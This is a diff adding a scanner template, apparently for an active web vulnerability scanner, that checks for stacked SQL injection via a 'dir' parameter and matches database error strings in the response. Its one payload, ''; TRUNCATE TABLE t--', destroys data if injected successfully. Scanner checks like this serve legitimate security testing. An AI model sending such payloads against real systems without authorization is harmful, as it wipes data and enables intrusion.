@@ -1,0 +1,25 @@
+id: sqli3-stacked-046
+name: 'Stacked query in dir'
+severity: critical
+type: active
+tags:
+  - sqli
+  - injection
+  - stacked
+description: 'Extra SQL statement via dir'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      dir:
+        - '''; TRUNCATE TABLE t--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
+          - 'ODBC'
+          - 'ORA-'
+          - 'SQLite'
